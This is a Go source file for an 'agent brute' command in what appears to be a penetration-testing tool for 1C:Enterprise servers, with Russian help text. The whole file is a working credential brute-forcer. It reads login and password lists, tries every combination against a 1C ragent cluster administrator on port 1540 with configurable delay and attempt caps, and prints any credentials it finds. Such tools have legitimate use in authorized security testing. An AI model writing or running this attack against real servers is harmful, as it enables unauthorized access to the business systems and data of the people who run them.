package cli

import (
	"context"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"time"

	"onechunter/internal/agent"
)

func runAgentBrute(args []string, stdout, stderr io.Writer) int {
	flags := flag.NewFlagSet("agent brute", flag.ContinueOnError)
	flags.SetOutput(stderr)
	target := flags.String("target", "", "Адрес ragent")
	agentPort := flags.Int("agent-port", 1540, "Порт ragent")
	clusterName := flags.String("cluster", "", "Имя защищённого кластера")
	usersPath := flags.String("users", "", "Файл с логинами, по одному на строку")
	passwordsPath := flags.String("passwords", "", "Файл с паролями, по одному на строку")
	delay := flags.Duration("delay", 100*time.Millisecond, "Задержка между попытками")
	maxAttempts := flags.Int("max-attempts", 1000, "Максимальное число попыток")
	username := flags.String("agent-user", "1chunter", "Имя пользователя NTLM")
	workstation := flags.String("workstation", "1CHUNTER", "Имя рабочей станции")
	locale := flags.String("locale", "1ru_RU", "Локаль протокола")
	timeout := flags.Duration("timeout", 5*time.Second, "Таймаут сетевых операций")
	if err := flags.Parse(args); err != nil {
		return 2
	}
	if *target == "" || *clusterName == "" || *usersPath == "" || *passwordsPath == "" ||
		*agentPort < 1 || *agentPort > 65535 || *delay < 0 || *maxAttempts < 1 || *timeout <= 0 {
		fmt.Fprintln(stderr, "Укажите --target, --cluster, --users, --passwords и корректные ограничения перебора")
		return 2
	}
	usernames, err := readCredentialFile(*usersPath)
	if err != nil {
		fmt.Fprintf(stderr, "Ошибка: %v\n", err)
		return 2
	}
	passwords, err := readCredentialFile(*passwordsPath)
	if err != nil {
		fmt.Fprintf(stderr, "Ошибка: %v\n", err)
		return 2
	}

	totalAttempts := len(usernames) * len(passwords)
	if totalAttempts > *maxAttempts {
		totalAttempts = *maxAttempts
	}
	progress := newProgressReporter(stdout, totalAttempts)
	progress.Start()
	client := agent.Client{Locale: *locale}
	result, err := client.BruteForceClusterAdmin(context.Background(), net.JoinHostPort(*target, strconv.Itoa(*agentPort)),
		*username, os.Getenv("ONECHUNTER_AGENT_PASSWORD"), *workstation, agent.ClusterBruteForceConfig{
			ClusterName: *clusterName,
			Usernames:   usernames,
			Passwords:   passwords,
			Delay:       *delay,
			MaxAttempts: *maxAttempts,
			OnAttempt:   progress.Update,
		}, *timeout)
	progress.Finish()
	if err != nil {
		fmt.Fprintf(stderr, "Ошибка: %v\n", err)
		return 1
	}
	if result.Found {
		fmt.Fprintf(stdout, "Кластер: %s\n", result.ClusterName)
		fmt.Fprintf(stdout, "Учётные данные найдены: %s:%s\n", result.Username, result.Password)
		fmt.Fprintf(stdout, "Попыток выполнено: %d\n", result.Attempts)
		return 0
	}
	fmt.Fprintf(stdout, "Учётные данные не найдены после %d попыток\n", result.Attempts)
	return 1
}
